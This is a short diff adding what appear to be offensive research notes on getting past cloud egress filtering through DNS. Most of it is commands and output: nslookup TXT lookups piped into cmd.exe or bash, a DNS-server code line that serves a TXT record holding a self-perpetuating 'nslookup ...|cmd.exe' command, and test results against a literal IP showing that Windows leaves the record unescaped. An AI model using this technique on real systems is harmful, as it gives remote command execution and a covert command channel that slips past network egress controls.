@@ -1,0 +1,22 @@
+VPC egress filter:
+http://www.guidepointsecurity.com/239/cloud-security/egress-controls-in-amazons-aws-virtual-private-cloud-vpc/
+https://cdn.amazonblogs.com/security_awsblog/images/ReferenceArchitecture.png
+
+nslookup -type=txt a.hack.com|cmd.exe
+
+reply.add_answer(RR(rname=qname, rtype=QTYPE.TXT, ttl=TTL, rdata=TXT("\"nslookup -type=txt t.hack.com|cmd.exe\"")))
+
+nslookup 2.test.com 209.126.180.164
+Server:		209.126.180.164
+Address:	209.126.180.164#53
+
+2.test.com	text = "\"nslook test|bash\""
+
+under windows  txt records are not escaped!
+nslookup -type=txt test.com 209.126.180.164
+Server:  UnKnown
+Address:  209.126.180.164
+
+test.hack.net    text =
+
+        ""nslookup -type=txt t 209.126.180.164|cmd.exe""
